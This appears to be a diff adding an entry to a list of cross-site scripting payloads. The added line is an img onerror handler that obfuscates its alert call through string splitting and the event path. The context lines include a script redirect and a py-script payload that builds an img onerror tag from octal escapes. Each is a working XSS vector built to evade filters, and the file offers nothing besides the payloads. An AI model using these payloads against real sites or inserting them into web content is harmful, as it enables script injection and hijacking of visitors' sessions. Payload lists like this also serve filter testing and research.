@@ -1,3 +1,5 @@
+<img/src/onerror=arguments[0].path.pop().['al'+'ert'](1)>
+
 <script>location.replace("URL")</script>
 
 <py-script>print('\74img/src/onerror\75alert(1)\76')</py-script>
